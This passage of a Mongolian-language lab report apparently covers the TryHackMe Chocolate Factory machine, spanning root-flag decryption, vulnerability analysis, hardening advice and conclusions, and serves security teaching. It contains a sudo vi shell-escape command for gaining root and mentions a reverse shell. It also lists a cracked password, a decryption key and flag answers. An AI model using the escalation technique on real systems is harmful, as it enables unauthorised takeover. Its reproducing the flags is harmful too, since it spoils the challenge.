dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()

display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")

print(display1)
print(display2)
print(mess)
```

Энэ скрипт нь `cryptography.fernet` санг ашиглан Fernet шифрлэлтийн түлхүүрийг хэрэглэгчээс авч, `encrypted_mess` хувьсагчид хадгалагдсан шифрлэгдсэн мэдээллийг тайлах зориулалттай.

`pyfiglet` сан нь үр дүнг том ASCII текст хэлбэрээр харуулахад ашиглагдсан. Харин шифр тайлах үндсэн үйлдэлд `cryptography.fernet` сан шаардлагатай.

## 4.13.3. Шифр тайлах түлхүүр

Өмнөх шатанд `key_rev_key` файлаас олсон түлхүүрийг ашиглах шаардлагатай байсан.

```text
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

Энэ түлхүүр нь Root flag-ийг тайлахад ашиглагдсан.

# 4.14. Python сангийн алдаа болон засвар

## 4.14.1. Эхний алдаа

Root скриптийг ажиллуулахад:

```bash

```

дараах алдаа гарсан:

```text

```

Энэ нь тухайн Python орчинд `cryptography` сан байхгүй эсвэл ашиглаж буй Python хувилбар уг санг олж чадахгүй байгааг илэрхийлж байсан.

Үүний дараа Python 3 ашиглан ажиллуулахад Fernet сангийн импорт амжилттай болсон.

## 4.14.2. Сүлжээний холболтын асуудал

Шаардлагатай сангуудыг суулгахын тулд дараах командыг ажиллуулсан:

```bash
apt update
```

Гэвч зорилтот серверээс Ubuntu package repository руу холбогдох үед IPv6 сүлжээний чиглүүлэлт байхгүй, IPv4 холболтууд хугацаа хэтэрсэн зэрэг алдаа гарсан.

Терминалд дараах төрлийн мэдээлэл гарсан:

```text
Network is unreachable
Connection timed out
```

Мөн:

```text
E: Unable to locate package python3-pyfiglet
```

гэсэн алдаа гарсан.

Энэ нь `pyfiglet` санг суулгах оролдлого амжилтгүй болсныг харуулсан. Гэхдээ `pyfiglet` нь зөвхөн ASCII дүрслэл гаргахад ашиглагддаг тул шифр тайлах үндсэн ажиллагаанд зайлшгүй шаардлагатай биш юм.

## 4.14.3. Fernet decrypt алдаа

Дараа нь:

```bash
python3 /root/root.py
```

командыг ажиллуулж түлхүүрийг оруулсан.

Үүний дараа:

```text
TypeError: token must be bytes
```

гэсэн алдаа гарсан.

Энэ алдаа нь Python 3 орчинд `Fernet.decrypt()` функцэд текстэн string биш, bytes төрөл дамжуулах шаардлагатай байснаас үүссэн.

## 4.14.4. Кодын засвар

`root.py` файлын дараах мөр:

```python
dcrypt_mess=f.decrypt(encrypted_mess)
```

байсныг:

```python
dcrypt_mess=f.decrypt(encrypted_mess.encode())
```

болгон өөрчилсөн.

`encode()` функц нь Python-ийн string өгөгдлийг bytes төрөлд хувиргана. Ингэснээр Fernet-ийн `decrypt()` функц шаардлагатай өгөгдлийн төрлийг хүлээн авах боломжтой болсон.

Энэ засвар нь шифрлэлтийн алгоритмыг өөрчилсөн биш, харин Python 3-ийн өгөгдлийн төрлийн шаардлагад нийцүүлсэн өөрчлөлт юм.

## 4.14.5. Скриптийг дахин ажиллуулах

```bash
python3 /root/root.py
```

Команд ажиллах үед:

```text
Enter the key:
```

гэсэн асуулт гарсан. Үүнд өмнө олсон Fernet түлхүүрийг оруулсан.

Ингэснээр шифрлэгдсэн мэдээллийг тайлах боломж бүрдсэн.

**Үр дүнгийн дүгнэлт:** Python 3-ийн string болон bytes төрлийн ялгаанаас үүссэн алдааг засаж, өмнө илрүүлсэн түлхүүрийг ашиглан Root flag-ийг тайлах ажиллагааг амжилттай гүйцэтгэсэн.

# 4.15. Root flag авах

Root түвшний хэрэглэгчийн эрхээр `/root/root.py` скриптийг ажиллуулж, Fernet түлхүүрийг оруулснаар шифрлэгдсэн мэдээллийг тайлсан.

# 5. ИЛЭРСЭН ЭМЗЭГ БАЙДЛЫН ТЕХНИКИЙН ШИНЖИЛГЭЭ

## 5.1. Anonymous FTP тохиргооны эрсдэл

FTP сервер anonymous нэвтрэлтийг зөвшөөрч байсан. Anonymous FTP нь хэрэглэгчийн хувийн бүртгэлгүйгээр тодорхой файл татах боломж олгодог.

Хэрэв серверийн администратор FTP хавтас дахь файлуудыг зөв хязгаарлаагүй бол гаднын хэрэглэгч серверээс нууц мэдээлэл, дотоод баримт бичиг, тохиргооны файл болон бусад өгөгдлийг татаж авах эрсдэлтэй.

Энэ лабораторид `gum_room.jpg` файл anonymous FTP-ээр татагдсан бөгөөд уг зураг дотор хэрэглэгчийн мэдээлэлтэй холбоотой өгөгдөл нуугдсан байсан.

**Эрсдэл:** Мэдээллийн нууцлал алдагдах, нууц мэдээлэл бусдад ил болох.

**Хамгаалах арга:** Anonymous FTP-г шаардлагагүй бол бүрэн хаах, шаардлагатай тохиолдолд зөвхөн нийтэд түгээх зориулалттай тусгай хавтас руу хязгаарлах, файл бичих болон унших эрхийг нарийн тохируулах.

## 5.2. Зураг файлд нууц мэдээлэл хадгалсан эрсдэл

`gum_room.jpg` зураг дотор Steganography ашиглан `b64.txt` мэдээллийг нуусан байсан.

Зураг файл нь гаднаасаа энгийн зураг мэт харагдаж байсан боловч тусгай хэрэгслээр шинжлэхэд доторх мэдээллийг гаргаж авах боломжтой байв.

Энэ нь нууц мэдээллийг зураг, аудио болон бусад файлд нуух нь өөрөө хамгаалалт биш гэдгийг харуулсан.

**Эрсдэл:** Нууц мэдээлэл зөвшөөрөлгүй этгээдэд ил болох.

**Хамгаалах арга:** Нууц мэдээллийг олон нийтэд хандах боломжтой файлд хадгалахгүй байх, файл хуваалцахын өмнө metadata болон embedded data шинжилгээ хийх, нууц мэдээллийг шаардлагатай үед хүчтэй шифрлэлтийн аргаар хамгаалах.

## 5.3. Сул нууц үг болон offline password cracking

Charlie хэрэглэгчийн нууц үгийн хэш зураг дотор нуугдсан файлаар дамжин ил болсон. Уг хэшийг John the Ripper ашиглан шалгахад `cn7824` гэсэн нууц үг илэрсэн.

Нууц үг богино, таамаглахад хялбар эсвэл нийтлэг үгийн жагсаалтад багтсан тохиолдолд offline cracking амжилттай болох магадлал өндөр байдаг.

**Эрсдэл:** Хэрэглэгчийн бүртгэлд зөвшөөрөлгүй нэвтрэх, хэрэглэгчийн нэрийн өмнөөс систем ашиглах.

**Хамгаалах арга:** Урт, давтагдашгүй нууц үг ашиглах, олон хүчин зүйлт нэвтрэлт танилт нэвтрүүлэх, Argon2id эсвэл bcrypt зэрэг орчин үеийн password hashing алгоритм ашиглах, хэшийн мэдээлэлд зөвхөн эрх бүхий хэрэглэгч хандах боломжтой болгох.

## 5.4. Веб програмын Command Execution эрсдэл

Веб интерфэйсийн команд ажиллуулах боломжийг ашиглан PHP кодоор системийн shell ажиллуулах нөхцөл бүрдсэн.

Хэрэв веб програм хэрэглэгчийн оролтыг зөв шалгахгүйгээр системийн команд руу дамжуулдаг бол Command Injection эсвэл зөвшөөрөлгүй команд ажиллуулах эрсдэл үүсдэг.

Энэ лабораторид уг боломжийг ашиглан `www-data` хэрэглэгчийн эрхээр Reverse Shell холболт үүсгэсэн.

**Эрсдэл:** Веб серверийн процессын эрхээр системийн команд ажиллуулах, серверийн файлд хандах, цаашдын эрх ахиулах ажиллагаанд шаардлагатай мэдээлэл олж авах.

**Хамгаалах арга:** Хэрэглэгчийн оролтыг шууд shell команд руу дамжуулахгүй байх, шаардлагатай үйлдлийг тусгай API эсвэл аюулгүй функцээр гүйцэтгэх, оролтын whitelist validation хийх, веб серверийн эрхийг хамгийн бага түвшинд хязгаарлах.

## 5.5. SSH хувийн түлхүүрийн хамгаалалт хангалтгүй байх

Charlie хэрэглэгчийн гэрийн хавтас дотор `teleport` нэртэй RSA хувийн түлхүүр хадгалагдаж байсан. Уг түлхүүрийг `www-data` эрхээр унших боломжтой байснаар Charlie хэрэглэгчийн SSH бүртгэлд нэвтрэх боломж бүрдсэн.

SSH хувийн түлхүүр нь нууц мэдээлэл бөгөөд түүнийг зөвшөөрөлгүй хэрэглэгч унших боломжтой байвал тухайн түлхүүрээр хамгаалагдсан бүртгэл эрсдэлд орно.

**Эрсдэл:** Хэрэглэгчийн SSH бүртгэлийг эзэмших, системд илүү өндөр эрхээр нэвтрэх.

**Хамгаалах арга:** Хувийн түлхүүрийн эрхийг `600` буюу эзэмшигчид л унших, бичих эрхтэй байхаар тохируулах, түлхүүрийг шаардлагатай бол passphrase-аар хамгаалах, түлхүүрийг веб серверийн хэрэглэгч унших боломжтой хавтсанд хадгалахгүй байх.

## 5.6. sudo эрхийн буруу тохиргоо ба vi shell escape

Charlie хэрэглэгчид `/usr/bin/vi` програмыг `sudo` ашиглан нууц үггүй ажиллуулах зөвшөөрөл олгосон байсан.

`vi` нь гаднын shell команд ажиллуулах боломжтой учраас түүнийг өндөр эрхээр ажиллуулах зөвшөөрөл нь зөвхөн текст засварлах эрхээр хязгаарлагдахгүй.

Энэ лабораторид `sudo /usr/bin/vi -c ':!/bin/sh' /dev/null` командыг ашигласнаар root shell нээгдсэн.

**Эрсдэл:** Энгийн хэрэглэгч системийн администраторын эрх авах, системийн файлуудыг өөрчлөх, хэрэглэгчийн мэдээлэлд хандах, үйлчилгээ зогсоох боломжтой болох.

**Хамгаалах арга:** `sudoers` тохиргоонд интерактив shell ажиллуулах боломжтой програмуудад хэт өргөн эрх олгохгүй байх, шаардлагатай командыг бүрэн зам болон тодорхой аргументаар хязгаарлах, `NOPASSWD` тохиргоог зөвхөн зайлшгүй шаардлагатай үйлдэлд ашиглах.

## 5.7. Python скрипт дотор шифр тайлах түлхүүрийг тусад нь олж болохоор хадгалсан эрсдэл

`root.py` файл дотор шифрлэгдсэн мэдээлэл хадгалагдаж байсан бөгөөд уг мэдээллийг тайлах түлхүүр нь өмнөх шатанд олдсон `key_rev_key` файлд байсан.

Шифрлэгдсэн өгөгдөл болон түүнийг тайлах түлхүүрийг нэг системийн хүрээнд хамгаалалтгүй байрлуулах нь шифрлэлтийн хамгаалалтыг сулруулдаг.

**Эрсдэл:** Түлхүүрт хандах боломжтой этгээд шифрлэгдсэн мэдээллийг тайлах.

**Хамгаалах арга:** Шифрлэлтийн түлхүүрийг өгөгдлөөс тусад нь хамгаалах, түлхүүрийн хандалтыг нарийн хязгаарлах, secrets management систем ашиглах, түлхүүрийн эргэлт болон шинэчлэлтийг тогтмол хийх.

# 7. USER FLAG БА ROOT FLAG

## 7.1. User Flag

**Файлын байршил:**

```text
/home/charlie/user.txt
```

**Ашигласан команд:**

```bash
cd /home/charlie
cat user.txt
```

**Уншсан хэрэглэгч:** Charlie

**Write-up-д өгөгдсөн flag:**

```text
flag{cd5509042371b34e4826e4838b522d2e}
```

User flag нь Charlie хэрэглэгчийн эрхээр зорилтот системд амжилттай нэвтэрч, тухайн хэрэглэгчийн гэрийн хавтас дахь хамгаалагдсан файлд хандаж чадсаныг илэрхийлнэ.

## 7.2. Root Flag

**Файлын байршил:**

```text
/root/root.py
```

Root flag нь скрипт дотор Fernet шифрлэлтийн аргаар хадгалагдсан байсан.

**Ашигласан команд:**

```bash
cd /root
cat root.py
python3 /root/root.py
```

**Шифр тайлах түлхүүр:** Өмнө нь `key_rev_key` файлаас олсон Fernet түлхүүр.

**Write-up-д өгөгдсөн flag:**

```text
flag{cec59161d338fef787fcb4e296b42124}
```

Root flag нь системийн хамгийн өндөр эрх болох root түвшинд хүрч, root хэрэглэгчийн хавтас дахь шифрлэгдсэн мэдээллийг тайлж чадсаныг батална.

**Нотолгооны ялгаа:** User болон Root flag-ийн дээрх утгууд нь ашигласан ANWAR1 Write-up-ийн Q4, Q5 хэсэгт өгөгдсөн хариултууд юм. Терминалын хадгалагдсан мэдээлэлд flag-ийн бүрэн хэвлэгдсэн мөр тусдаа харагдаагүй тул эдгээрийг Write-up-ийн утга гэж тодорхой тэмдэглэв.

# 8. ХАМГААЛАЛТЫН ЗӨВЛӨМЖ

Лабораторийн явцад илэрсэн асуудлууд нь системийн олон давхар хамгаалалт хангалтгүй байгааг харуулсан. Эдгээр эрсдэлийг бууруулахын тулд дараах арга хэмжээг хэрэгжүүлэх шаардлагатай.

## 8.1. Сүлжээний үйлчилгээний хамгаалалт

Сервер дээр шаардлагагүй сүлжээний портуудыг нээлттэй байлгахгүй байх хэрэгтэй. FTP, SSH, HTTP зэрэг үйлчилгээнүүдийг зөвхөн шаардлагатай сүлжээний сегментээс хандах боломжтой байхаар firewall ашиглан хязгаарлах нь зүйтэй.

Үйлчилгээний хувилбаруудыг тогтмол шинэчилж, хуучирсан протокол болон тохиргоог арилгах шаардлагатай.

## 8.2. FTP anonymous нэвтрэлтийг хязгаарлах

Anonymous FTP-г шаардлагагүй бол идэвхгүй болгох хэрэгтэй. Хэрэв нийтэд файл түгээх шаардлагатай бол зөвхөн тусгай зориулалтын хавтас ашиглаж, бусад системийн файл болон хэрэглэгчийн мэдээлэлд хандах боломжгүй болгох шаардлагатай.

## 8.3. Нууц мэдээллийн хамгаалалт

Нууц мэдээллийг зураг, текст, веб хавтас болон нийтэд нээлттэй файлд хадгалахгүй байх хэрэгтэй. Хэрэв файл дотор нууц өгөгдөл хадгалах шаардлагатай бол хүчтэй шифрлэлтийн алгоритм ашиглаж, түлхүүрийг өгөгдлөөс тусад нь хамгаалах шаардлагатай.

## 8.4. Нууц үгийн бодлого

Хэрэглэгчдэд урт, давтагдашгүй нууц үг ашиглах бодлого хэрэгжүүлэх хэрэгтэй. Нууц үгийн хэшүүдийг зөвхөн эрх бүхий хэрэглэгч унших боломжтой байлгаж, Argon2id, bcrypt зэрэг орчин үеийн password hashing алгоритм ашиглах нь зүйтэй.

## 8.5. Веб програмын командын аюулгүй байдал

Веб програмд хэрэглэгчийн оруулсан өгөгдлийг шууд системийн shell команд руу дамжуулахгүй байх хэрэгтэй. Хэрэв гаднын програм ажиллуулах шаардлагатай бол shell invocation-оос зайлсхийж, зөвшөөрөгдсөн команд болон параметрийн жагсаалтыг ашиглах нь зүйтэй.

Веб серверийн процессын эрхийг хамгийн бага түвшинд хязгаарлаж, програмын оролтын шалгалт болон лог бүртгэлийг сайжруулах шаардлагатай.

## 8.6. SSH түлхүүрийн хамгаалалт

SSH хувийн түлхүүрийг зөвхөн эзэмшигч хэрэглэгч унших эрхтэй байхаар тохируулах шаардлагатай.

```bash
chmod 600 ~/.ssh/id_rsa
```

Хувийн түлхүүрийг веб серверийн хэрэглэгч болон бусад системийн хэрэглэгчид унших боломжтой хавтсанд байрлуулахгүй байх хэрэгтэй. Түлхүүр алдагдсан тохиолдолд хуучин түлхүүрийг хүчингүй болгож шинэ түлхүүр үүсгэх шаардлагатай.

## 8.7. sudo эрхийн хяналт

`sudoers` файлд зөвхөн шаардлагатай командуудад эрх олгох хэрэгтэй. `vi`, `vim`, `less`, `find` зэрэг интерактив ажиллагаа болон гаднын команд ажиллуулах боломжтой програмуудад хязгаарлалтгүй sudo эрх өгөхөөс зайлсхийх шаардлагатай.

Хэрэглэгч бүрд зөвхөн ажлын үүргээ гүйцэтгэхэд шаардлагатай хамгийн бага эрх олгох Least Privilege Principle буюу хамгийн бага эрхийн зарчмыг мөрдөх хэрэгтэй.

## 8.8. SUID болон Linux capabilities хяналт

Энэ лабораторид SUID эмзэг байдал ашигласан нотолгоо байхгүй боловч Linux системийн эрхийн аудитын хүрээнд SUID болон capabilities тохиргоог тогтмол шалгах нь зүйтэй.

SUID эрхтэй програмууд нь файлын эзэмшигчийн эрхээр ажиллах боломжтой тул шаардлагагүй SUID тохиргоог арилгах шаардлагатай. Мөн `cap_setuid` зэрэг өндөр эрсдэлтэй Linux capabilities-ийг зөвхөн шаардлагатай програмд олгох хэрэгтэй.

## 8.9. Лог болон үйл явдлын хяналт

Сервер дээр FTP нэвтрэлт, SSH нэвтрэлт, sudo ашиглалт, веб серверийн алдаа болон сэжигтэй командын ажиллагааг тогтмол бүртгэх хэрэгтэй.

Ялангуяа олон удаагийн нэвтрэх оролдлого, ердийн бус shell процесс, веб серверийн хэрэглэгчээс эхэлсэн сүлжээний холболт, root эрхээр ажилласан програмуудыг хянах нь халдлагыг эрт илрүүлэхэд тусална.

## 8.10. Програм хангамжийн шинэчлэлт

Ubuntu системийн багцууд, Apache, OpenSSH, FTP сервер болон Python сангуудыг тогтмол шинэчлэх хэрэгтэй. Шинэчлэлт хийхээс өмнө нийцтэй байдлыг шалгаж, аюулгүй байдлын шинэчлэлтийг хугацаанд нь суулгах нь чухал.

# 10. ЛАБОРАТОРИЙН АЖЛЫН ҮР ДҮН

Энэхүү лабораторийн ажлын хүрээнд Chocolate Factory зорилтот системийн сүлжээний үйлчилгээ, файл хадгалалт, хэрэглэгчийн нууц үгийн хамгаалалт, веб програмын ажиллагаа болон Linux системийн эрхийн тохиргоонд шинжилгээ хийсэн.

Эхний шатанд Kali Linux болон зорилтот серверийн хоорондын сүлжээний холболтыг шалгаж, Nmap ашиглан нээлттэй портуудыг илрүүлсэн. Үүний үр дүнд FTP anonymous нэвтрэлт, SSH, HTTP болон бусад үйлчилгээ илэрсэн.

Дараагийн шатанд FTP серверээс зураг файл татаж авч, Steganography аргаар нуугдсан өгөгдлийг гарган авсан. Base64 кодчилсон мэдээллийг тайлсны дараа Charlie хэрэглэгчийн нууц үгийн хэш илэрч, John the Ripper ашиглан `cn7824` нууц үгийг олсон.

Уг нууц үгээр веб системд нэвтэрч, команд ажиллуулах боломжийг ашиглан Reverse Shell холболт үүсгэсэн. Ингэснээр `www-data` хэрэглэгчийн эрхээр зорилтот серверт хандсан.

Дараа нь Charlie хэрэглэгчийн гэрийн хавтас дахь RSA хувийн түлхүүрийг олж, Kali Linux системд хуулан SSH холболт үүсгэсэн. Charlie хэрэглэгчийн эрхээр User flag-д хүрэх нөхцөл бүрдсэн.

Эцэст нь `sudo -l` командаар `vi` програмыг нууц үггүй ажиллуулах эрх илэрсэн. `vi` програмын shell escape боломжийг ашиглан root shell нээж, `whoami` болон `id` командын үр дүнгээр UID 0 буюу root эрхийг баталгаажуулсан.

Root эрхээр `/root/root.py` файлыг шинжилж, өмнө олсон Fernet түлхүүрээр шифрлэгдсэн мэдээллийг тайлах ажиллагааг гүйцэтгэсэн. Python 3-ийн string болон bytes өгөгдлийн төрлийн ялгаанаас үүссэн алдааг зассаны дараа скриптийг ажиллуулах боломж бүрдсэн.

Ингэснээр лабораторийн эцсийн зорилго болох Root flag авах ажиллагааг амжилттай дуусгасан.

# 11. ДҮГНЭЛТ

Энэхүү лабораторийн ажлаар TryHackMe платформын Chocolate Factory Linux машины аюулгүй байдлыг нэвтрэлтийн туршилтын аргачлалаар судалж, мэдээлэл цуглуулахаас эхлээд системийн хамгийн өндөр эрх болох root түвшинд хүрэх хүртэлх ажиллагааг гүйцэтгэлээ.

Ажлын эхний шатанд Kali Linux орчноос зорилтот сервертэй сүлжээний холболт байгаа эсэхийг шалгаж, Nmap ашиглан нээлттэй портууд болон ажиллаж буй үйлчилгээнүүдийг илрүүлсэн. Үүний үр дүнд FTP үйлчилгээ anonymous нэвтрэлтийг зөвшөөрч байгааг тогтоосон нь анхны мэдээлэл цуглуулах чухал боломж болсон. FTP серверээс татсан `gum_room.jpg` зураг файлд Steganography аргаар нуугдсан мэдээлэл байсныг илрүүлж, `b64.txt` файлыг гарган авсан.

Base64 кодчилсон мэдээллийг тайлснаар Charlie хэрэглэгчийн нууц үгийн хэшэд хүрч, John the Ripper ашиглан offline password cracking ажиллагаа гүйцэтгэснээр `cn7824` нууц үгийг илрүүлсэн. Энэ үйл явц нь сул нууц үг ашиглах болон нууц мэдээллийг хамгаалалтгүй файлд хадгалах нь хэрэглэгчийн бүртгэлийг эрсдэлд оруулдгийг харуулсан.

Дараагийн шатанд веб үйлчилгээний команд ажиллуулах боломжийг ашиглан Reverse Shell холболт үүсгэж, `www-data` хэрэглэгчийн эрхээр серверт нэвтэрсэн. Энэ нь веб програмын оролтын шалгалт болон системийн команд ажиллуулах механизмын аюулгүй байдал хангалтгүй байх үед серверийн процессын эрхээр гаднын этгээд команд ажиллуулах боломжтой болдгийг харуулсан.

Charlie хэрэглэгчийн гэрийн хавтас дахь SSH хувийн түлхүүрийг илрүүлж, Kali Linux системд хуулан SSH холболт үүсгэсэн. Ингэснээр `www-data` хэрэглэгчийн эрхээс Charlie хэрэглэгчийн эрхэд шилжих боломж бүрдсэн. Энэ үе шат нь SSH хувийн түлхүүрийн нууцлал болон Linux файлын эрхийн тохиргоо ямар чухал болохыг харуулсан.

Privilege Escalation үе шатанд `sudo -l` командыг ашиглан Charlie хэрэглэгчийн эрхийн тохиргоог шалгаж, `/usr/bin/vi` програмыг нууц үггүй ажиллуулах боломжтой байгааг илрүүлсэн. `vi` програмын гаднын shell команд ажиллуулах боломжийг ашиглан root shell нээж, `whoami` болон `id` командын үр дүнгээр системийн root эрхийг баталгаажуулсан. Энэ нь интерактив програмуудад хэт өргөн sudo эрх олгох нь системийн бүрэн эрхийг алдах эрсдэлтэйг харуулсан.

Эцсийн шатанд `/root/root.py` файлын агуулгыг шинжилж, өмнөх шатанд `key_rev_key` файлаас олсон Fernet түлхүүрийг ашиглан шифрлэгдсэн Root flag-ийг тайлах ажиллагааг гүйцэтгэсэн. Python 3 орчны өгөгдлийн төрлийн алдааг зассанаар скриптийг ажиллуулах боломж бүрдэж, лабораторийн эцсийн зорилго биелсэн.

Энэхүү лабораторийн ажлын үр дүнд сүлжээний порт скан хийх, үйлчилгээний мэдээлэл шинжлэх, FTP anonymous нэвтрэлтийн эрсдэлийг үнэлэх, Steganography болон Base64 шинжилгээ хийх, нууц үгийн хэш шалгах, Reverse Shell холболт үүсгэх, SSH түлхүүр ашиглах, Linux хэрэглэгчийн эрх болон sudo тохиргоог шинжлэх зэрэг практик мэдлэг, чадварыг эзэмшсэн.

Мөн системийн аюулгүй байдал нь зөвхөн нэг програмын хамгаалалтаас хамаарахгүй бөгөөд сүлжээний үйлчилгээ, файл хадгалалт, нууц үгийн бодлого, веб програмын оролтын шалгалт, SSH түлхүүрийн хамгаалалт болон хэрэглэгчийн эрхийн удирдлага зэрэг олон хүчин зүйлээс хамаардаг болохыг бодит лабораторийн орчинд судалж баталгаажууллаа.

Иймээс байгууллагын Linux серверийн аюулгүй байдлыг хангахын тулд хамгийн бага эрхийн зарчмыг мөрдөх, шаардлагагүй сүлжээний үйлчилгээг хаах, нууц мэдээллийг хамгаалах, програм хангамжийг тогтмол шинэчлэх, sudo тохиргоог хянах, лог болон үйл явдлын хяналтыг сайжруулах нь чухал юм.

**Лабораторийн эцсийн үр дүн: Chocolate Factory машинд анхны хандалт авч, Charlie хэрэглэгчийн эрхэд шилжин, улмаар root түвшинд хүрч лабораторийг амжилттай дуусгасан.**
